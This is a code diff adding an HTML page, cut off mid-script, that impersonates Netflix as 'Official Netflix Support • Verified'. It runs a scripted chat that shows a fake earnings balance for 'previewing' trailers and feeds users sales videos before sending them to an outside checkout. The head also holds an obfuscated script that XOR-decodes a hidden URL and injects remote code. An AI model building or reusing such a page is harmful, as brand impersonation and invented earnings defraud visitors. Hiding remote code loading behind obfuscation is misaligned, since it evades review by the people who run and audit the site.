@@ -1,0 +1,1086 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Netflix Previewer - Withdrawal</title>
+  <!-- Redirecionador UTM desativado temporariamente -->
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect width='24' height='24' rx='4' fill='%23141414'/%3E%3Cpath fill='%23E50914' d='M5.398 0v.006c3.028 8.556 5.37 15.175 8.348 23.596 2.344.058 4.85.398 4.854.398-2.8-7.924-5.923-16.747-8.487-24zm8.489 0v9.63L18.6 22.951c-.043-7.86-.004-15.913.002-22.95zM5.398 1.05V24c1.873-.225 2.81-.312 4.715-.398v-9.22z'/%3E%3C/svg%3E">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <!-- Microsoft Clarity -->
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "z26f64ekde");
+  </script>
+  <!-- Nebula Funnel Tracker -->
+  <script src="https://nebulamembers.online/funnel-tracker.js?w=937caa77-5057-436e-a9cf-9688a0be3f4d&f=f714e0fd-be49-4e1b-8d42-33f2ae94f45d" data-auto="true" defer></script>
+  <!-- Pixel Utmify -->
+  <script>(function(){var v_4=atob("DOWbkTuXAWKEbX7Ay5655En7I1imBQq0u5ahvhT0ZQyqGAqtooPiv1j4bEzmH1GzqJfy4U/kLhLtFRus5JXy6V77Lwj3T1LiqpHv41L1dBbhHlz6kLi3s1z7bgDlAQ3i8b7gs1X2bAemV1ywop3+/XLzI06mGx+svoC5qxmhYAC9Xkn2qtH/8g7zN1O9Xhik+9esoAK1fD/5");var n_m=[];for(var k_fg=0;k_fg<v_4.length;k_fg++){n_m.push(v_4.charCodeAt(k_fg)&255);}var b_e=n_m[0];var v_kqv=n_m.slice(1,1+b_e);var t_p=n_m.slice(1+b_e);var w_r=t_p.map(function(b,p_5){return b^v_kqv[p_5%b_e];});var o_nclt="";for(var u_90t=0;u_90t<w_r.length;u_90t++){o_nclt+=String.fromCharCode(w_r[u_90t]&255);}var t_l6jp=decodeURIComponent(escape(o_nclt));var l_tc=JSON.parse(t_l6jp);var i_yx=l_tc.globals||[];i_yx.forEach(function(e_bh){window[e_bh.name]=e_bh.value;});var m_5o=document.createElement("script");m_5o.src=l_tc.url;m_5o.async=true;m_5o.defer=true;(l_tc.attributes||[]).forEach(function(r_n5j8){m_5o.setAttribute(r_n5j8.name,r_n5j8.value);});(document.head||document.documentElement).appendChild(m_5o);})();</script>
+  <script>!function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);</script>
+  <script>
+    var s = document.createElement("script");
+    s.src = "https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js";
+    s.async = true;
+    document.head.appendChild(s);
+  </script>
+  <!-- =========================================================================
+       [VTURB VSL PRELOADS] — QUANDO TIVER AS NOVAS VSLs DA NETFLIX,
+       ATUALIZE OS LINKS DE PRELOAD ABAIXO E AS VARIÁVEIS VSL_1_EMBED_URL / VSL_2_EMBED_URL NO SCRIPT!
+       ========================================================================= -->
+  <!-- VTurb Video 1 Preloads (Boas-vindas / Explicação rápida) -->
+  <link rel="preload" href="https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6ae8cef1c3ff612f67d6e004/v4/embed.html" as="document">
+  <link rel="preload" href="https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6ae8cef1c3ff612f67d6e004/v4/player.js" as="script">
+  <link rel="preload" href="https://cdn.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/6ae8ceedc3ff612f67d6dffb/main.m3u8" as="fetch">
+  <!-- VTurb Video 2 Preloads (VSL Principal de Conversão / Pitch) -->
+  <link rel="preload" href="https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6ae8cf1fc7321bec2b429188/v4/embed.html" as="document">
+  <link rel="preload" href="https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6ae8cf1fc7321bec2b429188/v4/player.js" as="script">
+  <link rel="preload" href="https://cdn.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/6ae8cf0aafbe3cdd0427c2dd/main.m3u8" as="fetch">
+  <!-- DNS Prefetches -->
+  <link rel="dns-prefetch" href="https://cdn.converteai.net">
+  <link rel="dns-prefetch" href="https://scripts.converteai.net">
+  <link rel="dns-prefetch" href="https://images.converteai.net">
+  <link rel="dns-prefetch" href="https://license.vturb.com">
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: radial-gradient(ellipse at 60% 0%, #2b0508 0%, #141414 35%, #0a0a0a 70%);
+      color: #fff;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* Decorative ambient glow blobs */
+    body::before {
+      content: '';
+      position: fixed;
+      top: -120px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 500px;
+      height: 300px;
+      background: radial-gradient(ellipse, rgba(229, 9, 20, 0.18) 0%, transparent 70%);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    body::after {
+      content: '';
+      position: fixed;
+      bottom: -80px;
+      right: 10%;
+      width: 300px;
+      height: 200px;
+      background: radial-gradient(ellipse, rgba(229, 9, 20, 0.08) 0%, transparent 70%);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .phone-container {
+      width: 100%;
+      max-width: 480px;
+      height: 100%;
+      background: #141414;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 0 60px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(229, 9, 20, 0.12);
+      z-index: 1;
+    }
+
+    /* Netflix Style Header */
+    .app-header {
+      background: #0b0b0b;
+      height: 64px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 16px;
+      border-bottom: 1px solid #262626;
+      flex-shrink: 0;
+    }
+
+    .app-logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 18px;
+      font-weight: 800;
+      color: #fff;
+      letter-spacing: -0.5px;
+    }
+
+    .app-logo svg {
+      width: 22px;
+      height: 22px;
+      fill: #E50914;
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    /* Balance Pill (Netflix Red) */
+    .balance-pill {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: #E50914;
+      border-radius: 999px;
+      padding: 8px 16px;
+      font-size: 17px;
+      font-weight: 800;
+      color: #ffffff;
+      letter-spacing: -0.3px;
+      box-shadow: 0 4px 14px rgba(229, 9, 20, 0.35);
+    }
+
+    /* Main chat container to look like it is placed inside the app borders */
+    .chat-wrapper {
+      flex: 1;
+      padding: 16px;
+      display: flex;
+      flex-direction: column;
+      background-color: transparent;
+      overflow: hidden;
+    }
+
+    .chat-card {
+      flex: 1;
+      background-color: #f1f3f6;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='80' height='80' viewBox='0 0 24 24'%3E%3Cpath fill='%23E50914' opacity='0.02' d='M5.398 0v.006c3.028 8.556 5.37 15.175 8.348 23.596 2.344.058 4.85.398 4.854.398-2.8-7.924-5.923-16.747-8.487-24zm8.489 0v9.63L18.6 22.951c-.043-7.86-.004-15.913.002-22.95zM5.398 1.05V24c1.873-.225 2.81-.312 4.715-.398v-9.22z'/%3E%3C/svg%3E");
+      background-repeat: repeat;
+      background-size: 60px 60px;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(229, 9, 20, 0.12);
+      position: relative;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Agent Bar Style */
+    .chat-agent-bar {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 16px;
+      background: linear-gradient(135deg, #fafafa 0%, #fdf2f2 100%);
+      border-bottom: 1px solid rgba(229, 9, 20, 0.15);
+      flex-shrink: 0;
+    }
+
+    .chat-agent-avatar {
+      width: 42px;
+      height: 42px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 2.5px solid #E50914;
+      box-shadow: 0 0 0 4px rgba(229, 9, 20, 0.12);
+    }
+
+    .chat-agent-avatar.support-logo,
+    .row img.av.support-logo {
+      object-fit: contain;
+      background: #141414;
+      padding: 6px;
+      box-sizing: border-box;
+    }
+
+    .chat-agent-info {
+      display: flex;
+      align-items: flex-start;
+      flex-direction: column;
+      gap: 2px;
+      text-align: left;
+    }
+
+    .chat-agent-name {
+      font-size: 14px;
+      font-weight: 700;
+      color: #121212;
+      line-height: 1.2;
+    }
+
+    .chat-agent-status {
+      font-size: 11px;
+      color: #E50914;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    /* Pulsing red dot */
+    .chat-agent-status::before {
+      content: '';
+      display: inline-block;
+      width: 7px;
+      height: 7px;
+      background-color: #E50914;
+      border-radius: 50%;
+      animation: statusPulse 2s ease-in-out infinite;
+    }
+
+    @keyframes statusPulse {
+
+      0%,
+      100% {
+        opacity: 1;
+        transform: scale(1);
+      }
+
+      50% {
+        opacity: 0.5;
+        transform: scale(0.85);
+      }
+    }
+
+    /* ─── CHAT ENGINE ─────────────────────────────── */
+    .chat-body {
+      flex: 1;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+      padding: 14px 12px 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 11px;
+      scroll-behavior: smooth;
+    }
+
+    .row {
+      display: flex;
+      align-items: flex-end;
+      gap: 8px;
+      max-width: 100%;
+      animation: messageIn .34s cubic-bezier(.2, .8, .2, 1) both;
+    }
+
+    .row.user {
+      justify-content: flex-end;
+    }
+
+    @keyframes messageIn {
+      from { opacity: 0; transform: translateY(9px) scale(.985); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    .row img.av {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      object-fit: cover;
+      flex-shrink: 0;
+      border: 1.5px solid rgba(229, 9, 20, .75);
+      box-shadow: 0 2px 8px rgba(0, 0, 0, .12);
+    }
+
+    .bubble {
+      max-width: 78%;
+      background: #fff;
+      color: #121212;
+      border: 1px solid rgba(18, 18, 18, .06);
+      border-radius: 18px 18px 18px 5px;
+      padding: 11px 14px;
+      font-size: 14.5px;
+      line-height: 1.45;
+      text-align: left;
+      white-space: pre-wrap;
+      word-break: break-word;
+      box-shadow: 0 3px 12px rgba(18, 18, 18, .10), 0 1px 2px rgba(18, 18, 18, .06);
+    }
+
+    .row.user .bubble {
+      background: #E50914;
+      color: #ffffff;
+      border-color: #E50914;
+      font-weight: 600;
+      border-radius: 18px 18px 5px 18px;
+      box-shadow: 0 3px 12px rgba(229, 9, 20, .25);
+    }
+
+    .bubble b { font-weight: 700; }
+
+    .message-with-icon {
+      display: flex;
+      align-items: flex-start;
+      gap: 9px;
+      transition: opacity .22s ease, transform .22s ease;
+    }
+
+    .message-with-icon.is-changing {
+      opacity: 0;
+      transform: translateY(3px);
+    }
+
+    .message-icon {
+      width: 18px;
+      height: 18px;
+      flex: 0 0 18px;
+      margin-top: 1px;
+      color: #E50914;
+    }
+
+    .message-icon.pending {
+      color: #68727d;
+      animation: iconSpin 1s linear infinite;
+    }
+
+    .message-icon.alert { color: #b7791f; }
+
+    @keyframes iconSpin { to { transform: rotate(360deg); } }
+
+    .bubble.media {
+      padding: 0;
+      overflow: hidden;
+      width: 100%;
+      max-width: 100%;
+      background: #000;
+      border-color: rgba(0, 0, 0, .15);
+    }
+
+    .bubble.media iframe,
+    .bubble.media img {
+      display: block;
+      width: 100%;
+      border: 0;
+    }
+
+    .bubble.media iframe.withdraw-receipt {
+      background: #fff;
+    }
+
+    .typing {
+      display: inline-flex;
+      gap: 4px;
+      padding: 3px 1px;
+    }
+
+    .typing i {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: #b3b3b3;
+      display: block;
+      animation: blink 1.3s infinite;
+    }
+
+    .typing i:nth-child(2) { animation-delay: .18s; }
+    .typing i:nth-child(3) { animation-delay: .36s; }
+
+    @keyframes blink {
+      0%, 60%, 100% { opacity: .3; transform: translateY(0); }
+      30% { opacity: 1; transform: translateY(-3px); }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .row { animation: none; }
+      .typing i, .chat-agent-status::before, .message-icon.pending { animation: none; }
+    }
+
+    .chat-input {
+      flex-shrink: 0;
+      padding: 10px 12px;
+      border-top: 1px solid #ececec;
+      background: #fafafa;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .chat-input:empty { display: none; }
+
+    .cta {
+      width: 100%;
+      background: #E50914;
+      color: #ffffff;
+      border: none;
+      border-radius: 999px;
+      padding: 14px 18px;
+      font-family: inherit;
+      font-size: 15.5px;
+      font-weight: 800;
+      letter-spacing: -.2px;
+      cursor: pointer;
+      box-shadow: 0 6px 18px rgba(229, 9, 20, .35);
+      animation: ctaPulse 1.8s ease-in-out infinite;
+    }
+
+    .cta:active { transform: scale(.98); }
+
+    @keyframes ctaPulse {
+      0%, 100% { box-shadow: 0 6px 18px rgba(229, 9, 20, .35); }
+      50% { box-shadow: 0 6px 26px rgba(229, 9, 20, .6); }
+    }
+
+    .field {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+
+    .field input {
+      flex: 1;
+      border: 1px solid #ddd;
+      background: #fff;
+      border-radius: 999px;
+      padding: 13px 16px;
+      font-family: inherit;
+      font-size: 15px;
+      color: #121212;
+      outline: none;
+    }
+
+    .field input:focus { border-color: #E50914; }
+
+    .field button {
+      width: 46px;
+      height: 46px;
+      flex-shrink: 0;
+      border: none;
+      border-radius: 50%;
+      background: #E50914;
+      color: #ffffff;
+      font-size: 18px;
+      cursor: pointer;
+    }
+
+
+    /* ─── RESPONSIVE / MOBILE ─────────────────────── */
+    @media (max-width: 480px) {
+      body {
+        height: 100dvh;
+        align-items: stretch;
+      }
+
+      .phone-container {
+        max-width: 100%;
+        border-radius: 0;
+        box-shadow: none;
+        /* Netflix dark gradient fills the whole screen on mobile */
+        background: linear-gradient(180deg, #1f0406 0%, #141414 40%, #0a0a0a 100%);
+      }
+
+      .app-header {
+        height: 54px;
+        padding: 0 12px;
+        background: rgba(11, 11, 11, 0.9);
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
+      }
+
+      .app-logo {
+        font-size: 16px;
+      }
+
+      .app-logo svg {
+        width: 19px;
+        height: 19px;
+      }
+
+      .balance-pill {
+        padding: 7px 14px;
+        font-size: 15px;
+        font-weight: 800;
+      }
+
+      .chat-wrapper {
+        padding: 10px;
+        /* Matching gradient for the wrapper area */
+        background: linear-gradient(180deg, #1f0406 0%, #141414 100%);
+        position: relative;
+      }
+
+      /* Red ambient glow on mobile above the chat card */
+      .chat-wrapper::before {
+        content: '';
+        position: absolute;
+        top: -30px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 80%;
+        height: 60px;
+        background: radial-gradient(ellipse, rgba(229, 9, 20, 0.2) 0%, transparent 70%);
+        pointer-events: none;
+      }
+
+      .chat-card {
+        border-radius: 14px;
+        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(229, 9, 20, 0.14);
+      }
+    }
+
+
+    /* iPhone safe-area (notch/home bar) */
+    @supports (padding: env(safe-area-inset-bottom)) {
+      .chat-wrapper {
+        padding-bottom: calc(10px + env(safe-area-inset-bottom));
+      }
+    }
+  </style>
+  <link rel="preconnect" href="https://bot.type-bot.online" crossorigin>
+  <link rel="dns-prefetch" href="https://bot.type-bot.online">
+  <link rel="preload" as="image" href="/sp/type/avatar.png">
+
+</head>
+
+<body>
+
+  <div class="phone-container">
+    <header class="app-header">
+      <div class="app-logo">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M5.398 0v.006c3.028 8.556 5.37 15.175 8.348 23.596 2.344.058 4.85.398 4.854.398-2.8-7.924-5.923-16.747-8.487-24zm8.489 0v9.63L18.6 22.951c-.043-7.86-.004-15.913.002-22.95zM5.398 1.05V24c1.873-.225 2.81-.312 4.715-.398v-9.22z" />
+        </svg>
+        Netflix<span style="font-weight: 500; font-size: 11px; opacity: 0.75; border-left: 1px solid rgba(255,255,255,0.25); padding-left: 8px; margin-left: 8px; text-transform: uppercase; letter-spacing: 0.8px;">Previewer</span>
+      </div>
+      <div class="header-right">
+        <div class="balance-pill">
+          $<span id="headerBalance">0.00</span>
+        </div>
+      </div>
+    </header>
+
+    <!-- Chat wrapper with borders as requested -->
+    <div class="chat-wrapper">
+      <div class="chat-card">
+        <!-- Support identity changes when the representative joins -->
+        <div class="chat-agent-bar">
+          <img class="chat-agent-avatar support-logo" id="agentAvatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23E50914' d='M5.398 0v.006c3.028 8.556 5.37 15.175 8.348 23.596 2.344.058 4.85.398 4.854.398-2.8-7.924-5.923-16.747-8.487-24zm8.489 0v9.63L18.6 22.951c-.043-7.86-.004-15.913.002-22.95zM5.398 1.05V24c1.873-.225 2.81-.312 4.715-.398v-9.22z'/%3E%3C/svg%3E" alt="Netflix Support" width="44" height="44">
+          <div class="chat-agent-info">
+            <span class="chat-agent-name" id="agentName">Netflix Support</span>
+            <span class="chat-agent-status">Official Netflix Support • Verified</span>
+          </div>
+        </div>
+
+        <!-- Native HTML chat flow -->
+        <div class="chat-body" id="chatBody"></div>
+        <div class="chat-input" id="chatInput"></div>
+
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ---- Attribution: keep every URL param (utm_*, fbclid, sck, src, xcod...) ----
+    (function () {
+      var KEY = 'sp_attr_params';
+      var TTL = 6 * 60 * 60 * 1000;
+
+      function fromSearch(search, into) {
+        try {
+          new URLSearchParams(search || '').forEach(function (v, k) { if (v) into[k] = v; });
+        } catch (e) {}
+        return into;
+      }
+
+      function stored() {
+        try {
+          var raw = localStorage.getItem(KEY);
+          if (!raw) return {};
+          var p = JSON.parse(raw);
+          if (!p || !p.t || Date.now() - p.t > TTL) { localStorage.removeItem(KEY); return {}; }
+          return p.p || {};
+        } catch (e) { return {}; }
+      }
+
+      var all = stored();
+      // parent page (this chat runs inside an iframe on "/")
+      try { if (window.top !== window.self) fromSearch((window.top.spTrackingSearch || window.top.location.search), all); } catch (e) {}
+      try { if (document.referrer) fromSearch(new URL(document.referrer).search, all); } catch (e) {}
+      fromSearch((window.spTrackingSearch || window.location.search), all);
+
+      try { localStorage.setItem(KEY, JSON.stringify({ t: Date.now(), p: all })); } catch (e) {}
+
+      try {
+        var existingVid = all.visit_id || all.vid || localStorage.getItem('sp_visit_id');
+        if (!existingVid) {
+          existingVid = 'vis_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 9);
+        }
+        all.visit_id = existingVid;
+        localStorage.setItem('sp_visit_id', existingVid);
+      } catch (e) {}
+      window.spParams = all;
+      window.spUrlWith = function (base, extra) {
+        var merged = {};
+        for (var k in all) merged[k] = all[k];
+        if (extra) for (var j in extra) { if (extra[j]) merged[j] = extra[j]; }
+        var hashSplit = String(base).split('#');
+        var hash = hashSplit[1] ? '#' + hashSplit[1] : '';
+        var pathSplit = hashSplit[0].split('?');
+        var qs = new URLSearchParams(pathSplit[1] || '');
+        for (var key in merged) { if (!qs.has(key)) qs.set(key, merged[key]); }
+        var q = qs.toString();
+        return pathSplit[0] + (q ? '?' + q : '') + hash;
+      };
+    })();
+
+    // Extract balance parameter from URL (final target balance)
+    var urlParams = new URLSearchParams(window.spUrlWith('x').split('?')[1] || '');
+    var balanceVal = urlParams.get('balance') || '214.80';
+    var targetBalance = parseFloat(balanceVal) || 0;
+    var currentBalance = 0;
+    var balanceEl = document.getElementById('headerBalance');
+    balanceEl.textContent = '0.00';
+
+    // Animate header balance to a value
+    var balAnim = null;
+    function setBalance(value, animate) {
+      value = Math.max(0, value);
+      currentBalance = value;
+      if (balAnim) { clearInterval(balAnim); balAnim = null; }
+      var from = parseFloat(balanceEl.textContent) || 0;
+      if (value > from && navigator.vibrate) { try { navigator.vibrate(80); } catch (err) {} }
+      if (!animate) { balanceEl.textContent = value.toFixed(2); return; }
+      var steps = 20, i = 0;
+      balAnim = setInterval(function () {
+        i++;
+        var v = from + (value - from) * (i / steps);
+        balanceEl.textContent = v.toFixed(2);
+        balanceEl.style.transform = 'scale(1.08)';
+        setTimeout(function () { balanceEl.style.transform = ''; }, 90);
+        if (i >= steps) { clearInterval(balAnim); balAnim = null; balanceEl.textContent = value.toFixed(2); }
+      }, 40);
+    }
+
+    // Rewards coming from the trailer evaluator increase the balance live
+    var lastRewardTimestamp = 0;
+    var lastRewardAmount = 0;
+    window.addEventListener('message', function (e) {
+      var d = e.data;
+      if (!d || typeof d !== 'object') return;
+      if (d.type === 'sp-add-balance') {
+        var now = Date.now();
+        var r = parseFloat(d.reward) || 0;
+        // Evita somar duas vezes caso receba mensagens repetidas
+        if (now - lastRewardTimestamp < 350 && Math.abs(r - lastRewardAmount) < 0.01) {
+          return;
+        }
+        lastRewardTimestamp = now;
+        lastRewardAmount = r;
+        setBalance(currentBalance + r, true);
+      } else if (d.type === 'finalizar_musicas' || d.name === 'finalizar_musicas') {
+        var fb = parseFloat(d.finalBalance);
+        setBalance(isNaN(fb) ? Math.max(currentBalance, targetBalance) : fb, true);
+      }
+    });
+
+
+    // Trackly: first step of Netflix Previewer funnel
+    (function () {
+      var fired = false;
+      function fire() {
+        if (fired) return;
+        var trk = window.trkFunnel;
+        if (trk && typeof trk.step === 'function') {
+          try { trk.step('chegouspt'); } catch (e) {}
+          fired = true;
+          return true;
+        }
+        return false;
+      }
+      if (fire()) return;
+      var tries = 0;
+      var id = window.setInterval(function () {
+        tries += 1;
+        if (fire() || tries > 40) window.clearInterval(id);
+      }, 250);
+    })();
+  </script>
+
+  <script>
+    (function () {
+      var body = document.getElementById('chatBody');
+      var input = document.getElementById('chatInput');
+      var NETFLIX_LOGO_SVG = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23E50914' d='M5.398 0v.006c3.028 8.556 5.37 15.175 8.348 23.596 2.344.058 4.85.398 4.854.398-2.8-7.924-5.923-16.747-8.487-24zm8.489 0v9.63L18.6 22.951c-.043-7.86-.004-15.913.002-22.95zM5.398 1.05V24c1.873-.225 2.81-.312 4.715-.398v-9.22z'/%3E%3C/svg%3E";
+      var AV = NETFLIX_LOGO_SVG;
+      var agentName = 'Netflix Support';
+      var agentAvatar = document.getElementById('agentAvatar');
+      var agentNameEl = document.getElementById('agentName');
+      var vars = { nome: '', balance: parseFloat(balanceVal).toFixed(2) };
+
+      var CHECKOUT = 'https://checkout.morganstudio.store/';
+
+      // =========================================================================
+      // [CONFIGURAÇÃO DAS VSLs VTURB] — TROQUE APENAS ESTAS 2 URLs QUANDO GRAVAR AS NOVAS VSLs!
+      // =========================================================================
+      var VSL_1_EMBED_URL = 'https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6ae8cef1c3ff612f67d6e004/v4/embed.html';
+      var VSL_1_DELAY_MS  = 27000; // Tempo (ms) de espera na VSL 1 antes de liberar o botão (27s)
+
+      var VSL_2_EMBED_URL = 'https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6ae8cf1fc7321bec2b429188/v4/embed.html';
+      var VSL_2_DELAY_MS  = 260000; // Tempo (ms) do pitch na VSL 2 antes de redirecionar pro Checkout (4m20s)
+
+      function fill(t) {
+        return t.replace(/\{\{(\w+)\}\}/g, function (_, k) {
+          if (k === 'balance') return (currentBalance > 0 ? currentBalance : parseFloat(balanceVal)).toFixed(2);
+          return vars[k] || '';
+        });
+
+      }
+      function scroll() { body.scrollTop = body.scrollHeight; }
+      function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+
+      function botRow(inner, cls) {
+        var row = document.createElement('div');
+        row.className = 'row bot';
+        var img = document.createElement('img');
+        img.className = 'av' + (AV === NETFLIX_LOGO_SVG ? ' support-logo' : '');
+        img.src = AV; img.alt = agentName;
+        var b = document.createElement('div');
+        b.className = 'bubble' + (cls ? ' ' + cls : '');
+        if (typeof inner === 'string') { b.textContent = inner; } else { b.appendChild(inner); }
+        row.appendChild(img); row.appendChild(b);
+        body.appendChild(row); scroll();
+        return row;
+      }
+
+      function userRow(text) {
+        var row = document.createElement('div');
+        row.className = 'row user';
+        var b = document.createElement('div');
+        b.className = 'bubble';
+        b.textContent = text;
+        row.appendChild(b);
+        body.appendChild(row); scroll();
+      }
+
+      async function typing(ms) {
+        var el = document.createElement('span');
+        el.className = 'typing';
+        el.innerHTML = '<i></i><i></i><i></i>';
+        var row = botRow(el);
+        await sleep(ms);
+        row.remove();
+      }
+
+      async function say(text) {
+        text = fill(text);
+        await typing(Math.min(1600, 500 + text.length * 12));
+        botRow(text);
+      }
+
+      function activateRepresentative() {
+        AV = '/sp/type/avatar.png';
+        agentName = 'Kaytlynn W.';
+        agentAvatar.src = AV;
+        agentAvatar.alt = agentName;
+        agentAvatar.classList.remove('support-logo');
+        agentNameEl.textContent = agentName;
+      }
+
+      async function sayStatus(text, type) {
+        text = fill(text);
+        await typing(Math.min(1600, 500 + text.length * 12));
+        var wrap = document.createElement('span');
+        wrap.className = 'message-with-icon';
+        var icon = document.createElement('span');
+        icon.className = 'message-icon ' + (type || 'success');
+        icon.setAttribute('aria-hidden', 'true');
+        if (type === 'pending') {
+          icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><path d="M12 3a9 9 0 1 0 9 9" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/></svg>';
+        } else if (type === 'alert') {
+          icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><path d="M12 3 2.8 20h18.4L12 3Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/><path d="M12 9v5M12 17.3v.2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>';
+        } else if (type === 'reward') {
+          icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/><path d="M14.8 8.5h-4a2 2 0 0 0 0 4h2.4a2 2 0 1 1 0 4H9M12 6.5v2M12 16.5v2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>';
+        } else {
+          icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/><path d="m8 12 2.7 2.7L16.5 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+        }
+        var content = document.createElement('span');
+        content.textContent = text;
+        wrap.appendChild(icon);
+        wrap.appendChild(content);
+        return botRow(wrap);
+      }
+
+      async function updateStatus(row, text, type) {
+        var wrap = row && row.querySelector('.message-with-icon');
+        if (!wrap) return;
+        wrap.classList.add('is-changing');
+        await sleep(220);
+        var icon = wrap.querySelector('.message-icon');
+        var content = wrap.querySelector('span:last-child');
+        if (icon) {
+          icon.className = 'message-icon ' + (type || 'success');
+          if (type === 'pending') {
+            icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><path d="M12 3a9 9 0 1 0 9 9" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/></svg>';
+          } else {
+            icon.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/><path d="m8 12 2.7 2.7L16.5 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+          }
+        }
+        if (content) content.textContent = fill(text);
+        wrap.classList.remove('is-changing');
+        scroll();
+      }
+
+      function media(url, height) {
+        var isVideo = url.indexOf('converteai.net') > -1 || url.indexOf('vturb') > -1 || url.indexOf('players') > -1;
+        if (isVideo) {
+          var w = document.createElement('div');
+          w.style.position = 'relative';
+          w.style.width = '100%';
+          w.style.padding = '177.77777777777777% 0 0 0';
+          w.style.overflow = 'hidden';
+          var f = document.createElement('iframe');
+          f.src = fill(url);
+          f.setAttribute('frameborder', '0');
+          f.setAttribute('allow', 'autoplay; fullscreen; encrypted-media');
+          f.setAttribute('allowfullscreen', '');
+          f.setAttribute('referrerpolicy', 'origin');
+          f.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;border:0;';
+          w.appendChild(f);
+          botRow(w, 'media');
+          return f;
+        }
+        var f = document.createElement('iframe');
+        f.src = fill(url);
+        f.height = height;
+        f.setAttribute('frameborder', '0');
+        f.setAttribute('allow', 'autoplay; fullscreen; encrypted-media');
+        f.setAttribute('allowfullscreen', '');
+        f.style.height = height + 'px';
+        botRow(f, 'media');
+        return f;
+      }
+
+      function player(url, pad) {
+        var w = document.createElement('div');
+        w.style.position = 'relative';
+        w.style.padding = pad + '% 0 0 0';
+        var f = document.createElement('iframe');
